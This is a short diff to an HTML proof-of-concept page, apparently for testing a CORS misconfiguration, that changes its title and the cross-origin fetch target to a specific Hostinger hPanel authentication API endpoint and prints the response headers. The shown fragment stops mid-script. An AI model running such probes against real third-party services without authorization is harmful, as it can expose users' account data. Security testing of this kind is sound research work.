@@ -4,13 +4,13 @@
   <title>CORS PoC</title>
 </head>
 <body>
-  <h2>CORS Test PoC</h2>
+  <h2>CORS Test 2 PoC</h2>
   <pre id="output">Loading...</pre>
 
   <script>
     async function test() {
       try {
-        let res = await fetch("https://hpanel.hostinger.com/api/auth/api/external/v1/invitations");
+        let res = await fetch("https://hpanel.hostinger.com/api/auth/api/external/v1/access?gaid=GA1.1.1770165202.1756321190");
         
         let headers = "";
         for (let [k, v] of res.headers.entries()) {
